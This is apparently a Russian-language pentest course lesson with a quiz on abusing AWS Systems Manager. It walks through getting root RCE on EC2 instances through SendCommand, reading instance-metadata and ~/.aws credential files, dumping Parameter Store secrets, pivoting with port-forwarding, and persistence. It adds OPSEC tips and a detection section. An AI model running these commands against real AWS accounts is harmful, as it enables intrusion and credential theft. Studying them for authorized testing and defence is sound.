---
id: cloud-aws-ssm
title: "SSM: Run Command, Parameter Store и Session Manager"
category: cloud
parent: cloud-aws-deep
difficulty: hard
order: 3
tags: [cloud, aws, ssm, run-command, parameter-store, session-manager, rce]
prerequisites: [cloud-aws-deep, cloud-iam-basics]
useful_for:
  - "RCE на парке EC2 через SSM"
  - "Кража секретов из Parameter Store"
  - "Пентест внутренней инфраструктуры AWS"
estimated_minutes: 50
summary: "Как ssm:SendCommand превращается в выполнение кода на инстансах, где лежат секреты в Parameter Store и как Session Manager даёт интерактивный доступ без SSH."
---

## Зачем этот урок

AWS Systems Manager (SSM) — это «удалённое управление парком»: обновления, инвентаризация, запуск команд, хранение параметров, интерактивные сессии. Для защитников это способ убрать SSH-ключи и bastion. Для атакующего это **RCE-as-a-service**: если у вашей роли есть `ssm:SendCommand`, вы выполняете команды на любом инстансе с SSM-агентом — от имени `root` (Linux) или `SYSTEM` (Windows), без единого открытого порта. Плюс Parameter Store и SecureString часто хранят пароли БД, API-ключи и токены. Этот урок — про то, как превратить права SSM в код и креды.

## Как устроен SSM

Ключевые компоненты:

- **SSM Agent** — демон на инстансе (`amazon-ssm-agent`), который держит исходящее соединение к сервису SSM. Порты наружу не нужны.
- **Managed instance** — инстанс, зарегистрированный в SSM (имеет `mi-...` id). Требует instance profile с `AmazonSSMManagedInstanceCore`.
- **Documents** — скрипты/плейбуки (AWS-предоставленные и свои). `AWS-RunShellScript` — самый важный.
- **Run Command** — `ssm:SendCommand` исполняет документ на выбранных инстансах.
- **Parameter Store** — иерархическое хранилище параметров; `SecureString` шифруется KMS.
- **Session Manager** — интерактивная сессия (shell) через SSM, без SSH и открытых портов.

Права, которые ищет атакующий: `ssm:SendCommand`, `ssm:StartSession`, `ssm:GetParameter(s)`, `ssm:GetCommandInvocation`, `ssm:DescribeInstanceInformation`.

## Инструменты и команды

Разведка парка:

```bash
# Какие инстансы управляются SSM
aws ssm describe-instance-information \
  --query 'InstanceInformationList[].{Id:InstanceId,Name:ComputerName,Ping:PingStatus,Platform:PlatformName}'

# Список документов
aws ssm list-documents --filters Key=Owner,Values=Self
```

RCE через Run Command:

```bash
aws ssm send-command \
  --document-name "AWS-RunShellScript" \
  --targets "Key=instanceids,Values=i-0123456789abcdef0" \
  --parameters 'commands=["id","hostname","cat /etc/passwd | head"]' \
  --output text --query 'Command.CommandId'
# => 8f2c...

# Получить результат (подождать несколько секунд)
aws ssm get-command-invocation \
  --command-id 8f2c... --instance-id i-0123456789abcdef0 \
  --query 'StandardOutputContent' --output text
```

Чтение Parameter Store:

```bash
aws ssm describe-parameters --query 'Parameters[].Name'
aws ssm get-parameters-by-path --path "/" --recursive --with-decryption \
  --query 'Parameters[].{Name:Name,Value:Value}'
```

Session Manager:

```bash
aws ssm start-session --target i-0123456789abcdef0
# Требует Session Manager plugin; даёт интерактивный shell
```

## Разобранный пример: от права SendCommand к root на инстансе

Сценарий: после Cognito/утечки ключа у роли есть `ssm:*`. Разведка показывает managed instance `i-0abc`.

Шаг 1 — определяем платформу инстанса, чтобы выбрать документ:

```bash
aws ssm describe-instance-information \
  --query 'InstanceInformationList[].{Id:InstanceId,Platform:PlatformName,Ping:PingStatus}'
[{"Id":"i-0abc","Platform":"Linux","Ping":"Online"}]
```

Шаг 2 — запускаем команду. Полезно сразу выяснить, кто мы и какие креды есть на инстансе:

```bash
aws ssm send-command --document-name "AWS-RunShellScript" \
  --targets "Key=instanceids,Values=i-0abc" \
  --parameters 'commands=["whoami","id","curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/"]' \
  --output text --query 'Command.CommandId'
```

Шаг 3 — читаем вывод. `whoami` вернёт `root` (SSM-агент исполняет команды от root). Если на инстансе есть instance profile, `curl` к metadata вернёт имя роли — а следующий запрос отдаст **креды роли инстанса**, которые обычно шире, чем ваши:

```bash
aws ssm get-command-invocation --command-id 8f2c... --instance-id i-0abc \
  --query 'StandardOutputContent' --output text
# root
# uid=0(root) gid=0(root) groups=0(root)
# WebServerRole
```

Шаг 4 — расширяем доступ. Через SSM можно выкачать приватный SSH-ключ, положить свой ключ в `authorized_keys`, поднять reverse shell или сразу прочитать `~/.aws/credentials` и переменные окружения сервисов:

```bash
aws ssm send-command --document-name "AWS-RunShellScript" \
  --targets "Key=instanceids,Values=i-0abc" \
  --parameters 'commands=["cat /home/*/.aws/credentials 2>/dev/null","env | grep -i aws","ls -la /root/.ssh"]' \
  --output text --query 'Command.CommandId'
```

Шаг 5 — Parameter Store. Часто именно там лежат пароли БД, которые открывают следующий хост:

```bash
aws ssm get-parameters-by-path --path "/prod/" --recursive --with-decryption \
  --query 'Parameters[].{Name:Name,Value:Value}' --output table
```

Цепочка: `ssm:SendCommand` → root на инстансе → instance profile креды → Parameter Store → пароль БД → lateral movement.

## Варианты атак и обходы

- **Windows.** Документ `AWS-RunPowerShellScript` даёт исполнение от `NT AUTHORITY\SYSTEM`.
- **Через ассоциации.** `ssm:CreateAssociation` с расписанием позволяет закрепиться: команда будет выполняться периодически.
- **Session Manager без SSH.** `start-session` даёт полноценный PTY; можно поднять port-forwarding (`AWS-StartPortForwardingSession`) к внутренним сервисам — то есть использовать инстанс как pivot.
- **Parameter Store как источник.** Даже без `SendCommand` право `ssm:GetParameter*` на `SecureString` может отдать креды. Ищите пути вроде `/prod/db/password`, `/ci/tokens`.
- **Обход через State Manager.** Если `SendCommand` запрещён, но разрешён `CreateAssociation`, добиваемся того же результата легальной ассоциацией.
- **Эксфильтрация через SSM.** Вывод команды читается через `GetCommandInvocation` — не нужен открытый канал наружу.

## Частые ошибки и подводные камни

- **Инстанс не managed.** Если SSM-агента нет или instance profile без `AmazonSSMManagedInstanceCore`, `SendCommand` не сработает.
- **Ждать вывода сразу.** `GetCommandInvocation` до завершения вернёт `InProgress`; делайте паузу или поллинг.
- **Квота вывода.** Вывод команды усечён (по умолчанию ~24 КБ). Для больших файлов пишите в S3 и забирайте оттуда, либо base64-частями.
- **Не проверять `get-caller-identity`.** Убедитесь, что это ваш доступ, а не shared role.
- **Логировать в CloudTrail каждый шаг.** `SendCommand` — громкое событие; для OPSEC помните, что оно остаётся в логах.
- **`--parameters` JSON.** Неправильные кавычки в `commands=[...]` — частая ошибка; проверяйте формат.

## Защита и детект

- **Минимальные права.** `ssm:SendCommand`/`StartSession` не должны быть у широких ролей. Ограничивайте resource-ARN и тегами инстансов.
- **Ограничивайте Parameter Store.** `SecureString` с `kms:Decrypt`-условиями; не храните долгоживущие креды в открытых путях.
- **Детект.** CloudTrail события `SendCommand`, `StartSession`, `GetParameter`. GuardDuty findings `Discovery:...`, `UnauthorizedAccess:IAMUser/...`. Алерты на `SendCommand` с необычного principal, на чтение секретных параметров вне CI.
- **Аудит.** Включите логирование SSM-сессий (Session Manager logging в S3/CloudWatch) и запись команд Run Command.
- **Мониторинг.** Необычные ассоциации State Manager, новые документы, `StartSession` из внешнего IP.

## SSM в контейнерах, гибридных и мульти-аккаунт средах

SSM не ограничен EC2. Понимание этих вариантов расширяет поверхность:

- **ECS/Fargate.** Задачи ECS могут быть зарегистрированы как managed instances, если включён `ExecuteCommand` (через SSM-агент в контейнере). Тогда `ssm:StartSession` даёт shell внутри контейнера, а права — это **task role**, а не instance role (`cloud-aws-ecs`).
- **On-premises (гибрид).** SSM Hybrid Activations регистрируют сервер вне AWS как managed instance. Если активация скомпрометирована, `SendCommand` исполняет код на инфраструктуре компании вне облака — это мост из AWS в ДЦ.
- **Мульти-аккаунт.** `SendCommand` действует в рамках аккаунта и региона. Для lateral movement между аккаунтами нужен либо `sts:AssumeRole`, либо SSM-документ, который сам вызывает API с ролью инстанса.
- **Parameter Store shared.** Через `ssm:GetParametersByPath` можно читать параметры, общие для всей организации, — часто там лежат общие секреты CI и БД.

Отдельно стоит **Session Manager port forwarding** — недооценённый инструмент pivot:

```bash
# Пробросить локальный порт к внутреннему сервису через инстанс
aws ssm start-session --target i-0abc \
  --document-name AWS-StartPortForwardingSession \
  --parameters '{"portNumber":["3306"],"localPortNumber":["13306"]}'
# Теперь mysql -h 127.0.0.1 -P 13306 идёт к БД во внутренней подсети
```

Это превращает managed instance в точку pivot без установки туннельного бинарника — трафик идёт по уже разрешённому исходящему соединению SSM-агента.

## SSM vs другие механизмы удалённого исполнения

| Механизм | Нужен открытый порт | Пользователь на цели | Тип доступа |
|----------|--------------------|----------------------|-------------|
| SSM Run Command | Нет | root/SYSTEM | Неинтерактивный RCE |
| SSM Session Manager | Нет | root/SYSTEM | Интерактивный shell/порт-форвард |
| EC2 Instance Connect | 22 (или через агент) | указанный | SSH-вход |
| EC2 serial console | Нет | root | Консоль |
| Lambda invoke | Нет | роль функции | Serverless RCE |

Практический вывод: `ssm:SendCommand` и `ssm:StartSession` — это два независимых права, и наличие только `StartSession` тоже даёт интерактивный доступ. Проверяйте оба в разведке прав. Если `SendCommand` запрещён, но `StartSession` разрешён — вы всё равно внутри.

## OPSEC и снижение шума

SSM — один из самых «громких» сервисов AWS: каждое `SendCommand`, `StartSession` и `GetParameter` пишется в CloudTrail с вашим principal ARN. Практические соображения:

- **Минимизируйте число вызовов.** Одна команда, возвращающая сразу `id`, окружение и содержимое `~/.aws`, лучше десяти мелких.
- **Не создавайте очевидных артефактов.** Новые документы с вашим именем, ассоциации State Manager с расписанием и свои SSH-ключи в `authorized_keys` надолго остаются в аккаунте и легко обнаруживаются.
- **Учитывайте регион.** SSM-инстансы видны только в своём регионе; сканирование всех регионов увеличивает шум.
- **Parameter Store читается без RCE.** Иногда право `ssm:GetParameter` на конкретный путь уже даёт пароль БД — не поднимайте Run Command там, где хватит чтения параметра.
- **Session Manager логируется отдельно.** Если включено логирование сессий в S3/CloudWatch, весь ваш интерактивный ввод сохранится — это прямой след для IR.

Помните, что цель пентеста — не просто получить RCE, а показать путь и остаться в рамках согласованных правил. Если `SendCommand` — «шумный» и легко детектируемый путь, отметьте это в отчёте как риск: команда защиты должна видеть такие вызовы.

## Что дальше / решение

`ssm:SendCommand` — это почти всегда RCE. Первым делом выясните, **кто вы на инстансе** (`whoami`, `id`) и **какие креды там лежат** (instance profile, `~/.aws`, переменные окружения, файлы сервисов). Затем — Parameter Store: он часто содержит «ключ к следующей двери». Если цель — персистентность, используйте ассоциации или положите свой SSH-ключ. Дальше маршрутизируйте всё через инстанс как pivot (`svc-pivoting`) и идите вглубь VPC. Записывайте каждый шаг как attack step с командой и выводом.

## Квиз

```quiz
- question: "От какого пользователя SSM Run Command исполняет команды на Linux-инстансе?"
  options:
    - "root"
    - "ssm-user без прав"
    - "nobody"
    - "ec2-user без sudo"
  answer: 0
  explanation: "SSM-агент запускает AWS-RunShellScript от root, поэтому это прямой RCE."
- question: "Почему для SSM не нужен открытый входящий порт?"
  options:
    - "Агент сам устанавливает исходящее соединение к сервису SSM"
    - "SSM использует SSH-порт"
    - "SSM работает только локально"
    - "SSM использует DNS"
  answer: 0
  explanation: "Агент polling-ом держит исходящий канал, поэтому bastion/SSH не нужны."
- question: "Где часто лежат пароли БД для следующего шага?"
  options:
    - "В SSM Parameter Store (SecureString)"
    - "В Route 53"
    - "В CloudFront"
    - "В IAM-политике"
  answer: 0
  explanation: "Parameter Store — типовое хранилище секретов приложений и CI."
- question: "Как прочитать вывод команды Run Command?"
  options:
    - "Через get-command-invocation по CommandId"
    - "Через S3 по умолчанию"
    - "Через email"
    - "Никак, вывод недоступен"
  answer: 0
  explanation: "GetCommandInvocation возвращает StandardOutputContent после завершения."
```

## Где пригодится

- **Пентест AWS:** превращение прав SSM в RCE и креды.
- **Red team:** pivot через управляемые инстансы без SSH.
- **Bug bounty:** редко, но SSM-мисконфиги встречаются.
- **Blue team:** аудит прав SendCommand/StartSession и логирование сессий.
